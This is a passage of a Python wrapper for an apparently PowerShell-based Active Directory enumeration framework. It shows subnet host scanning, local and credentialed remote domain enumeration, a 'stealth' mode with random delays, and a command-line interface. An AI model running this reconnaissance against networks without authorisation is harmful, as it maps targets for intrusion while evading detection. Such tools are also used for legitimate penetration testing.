        """Scan network for live hosts"""
        Logger.section(f"Scanning Network: {subnet}")
        
        # Create a simple script to scan the network
        scan_script = self.ps_scripts_dir / "temp_network_scan.ps1"
        with open(scan_script, 'w') as f:
            f.write(f"""# Temporary network scan script
. "{self.network_scanner_script}"
Scan-Network -Subnet "{subnet}" -Threads {threads}
""")
        
        # Execute the script
        output = self.execute_powershell_local(scan_script)
        
        # Save the raw output
        filepath = self.save_results("network", output, "network_scan")
        
        # Parse the results
        Logger.info("Processing network scan results...")
        
        # Try to parse the output as a list of hosts
        hosts = []
        for line in output.splitlines():
            if ":" in line and "Status" in line:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    key = parts[0].strip()
                    value = parts[1].strip()
                    
                    if key == "IP":
                        hosts.append({"ip": value})
                    elif key == "Status" and hosts:
                        hosts[-1]["status"] = value
                    elif key == "HostName" and hosts:
                        hosts[-1]["hostname"] = value
        
        # Save the structured results
        self.save_json_results("network", {"hosts": hosts}, "parsed_network_scan")
        
        return {
            "output": output,
            "hosts": hosts,
            "output_file": str(filepath)
        }
    
    def run_full_enumeration(self, targets: List[str] = None, username: str = None, password: str = None, stealth: bool = False) -> Dict[str, Any]:
        """Run full enumeration against multiple targets"""
        self.start_time = datetime.now()
        
        Logger.section("Starting AD Enumeration Framework")
        Logger.info(f"Start Time: {self.start_time}")
        
        all_results = {
            "start_time": str(self.start_time),
            "targets": targets,
            "local_enumeration": None,
            "remote_enumeration": []
        }
        
        # First, try local enumeration if we're joined to a domain
        Logger.info("Attempting local domain enumeration...")
        
        try:
            local_results = self.enum_domain_local(stealth=stealth)
            all_results["local_enumeration"] = local_results
            Logger.success("Local enumeration completed successfully")
        except Exception as e:
            Logger.error(f"Error during local enumeration: {str(e)}")
        
        # If targets are specified, try remote enumeration
        if targets and username and password:
            for target in targets:
                Logger.info(f"Attempting remote enumeration against {target}...")
                
                try:
                    remote_results = self.enum_domain_remote(target, username, password, stealth=stealth)
                    all_results["remote_enumeration"].append({
                        "target": target,
                        "results": remote_results,
                        "success": True
                    })
                    Logger.success(f"Remote enumeration against {target} completed successfully")
                except Exception as e:
                    Logger.error(f"Error during remote enumeration against {target}: {str(e)}")
                    all_results["remote_enumeration"].append({
                        "target": target,
                        "error": str(e),
                        "success": False
                    })
        
        # Complete the operation
        self.end_time = datetime.now()
        duration = self.end_time - self.start_time
        
        all_results["end_time"] = str(self.end_time)
        all_results["duration"] = str(duration)
        
        Logger.section("AD Enumeration Complete")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"End Time: {self.end_time}")
        Logger.info(f"Duration: {duration}")
        
        # Save overall results
        summary_file = self.results_dir / f"enumeration_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(summary_file, 'w') as f:
            json.dump(all_results, f, indent=4)
        
        Logger.success(f"Summary saved to {summary_file}")
        
        return all_results

def main():
    parser = argparse.ArgumentParser(description=f'{Colors.BOLD}PowerShell-Based AD Enumeration Framework{Colors.ENDC}')
    
    # Main command subparsers
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Local enumeration command
    local_parser = subparsers.add_parser('local', help='Enumerate domain from local system')
    local_parser.add_argument('-s', '--stealth', action='store_true', help='Use stealth mode (random delays)')
    local_parser.add_argument('-t', '--threads', type=int, default=10, help='Maximum number of threads to use')
    local_parser.add_argument('-n', '--subnet', help='Subnet to scan (e.g., 192.168.1.0/24)')
    local_parser.add_argument('-o', '--output', help='Custom output directory')
    
    # Remote enumeration command
    remote_parser = subparsers.add_parser('remote', help='Enumerate domain from remote system')
    remote_parser.add_argument('-t', '--target', required=True, help='Target IP address or hostname')
    remote_parser.add_argument('-u', '--username', required=True, help='Username for authentication')
    remote_parser.add_argument('-p', '--password', required=True, help='Password for authentication')
    remote_parser.add_argument('-s', '--stealth', action='store_true', help='Use stealth mode (random delays)')
    remote_parser.add_argument('--threads', type=int, default=5, help='Maximum number of threads to use')
    
    # Network scan command
    scan_parser = subparsers.add_parser('scan', help='Scan network for live hosts')
    scan_parser.add_argument('-n', '--subnet', required=True, help='Subnet to scan (e.g., 192.168.1.0/24)')
    scan_parser.add_argument('-t', '--threads', type=int, default=20, help='Maximum number of threads to use')
    
    # Full enumeration command
    full_parser = subparsers.add_parser('full', help='Run full enumeration')
    full_parser.add_argument('-t', '--targets', nargs='+', help='Target IP addresses or hostnames')
    full_parser.add_argument('-u', '--username', help='Username for remote authentication')
    full_parser.add_argument('-p', '--password', help='Password for remote authentication')
    full_parser.add_argument('-s', '--stealth', action='store_true', help='Use stealth mode (random delays)')
    
    args = parser.parse_args()
    
    framework = PowerShellEnumeration()
    
    # Handle commands
    if args.command == 'local':
        framework.enum_domain_local(stealth=args.stealth, thread_limit=args.threads, subnet=args.subnet, output_dir=args.output)
    elif args.command == 'remote':
        framework.enum_domain_remote(args.target, args.username, args.password, stealth=args.stealth, thread_limit=args.threads)
    elif args.command == 'scan':
        framework.scan_network(args.subnet, args.threads)
    elif args.command == 'full':
        framework.run_full_enumeration(targets=args.targets, username=args.username, password=args.password, stealth=args.stealth)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()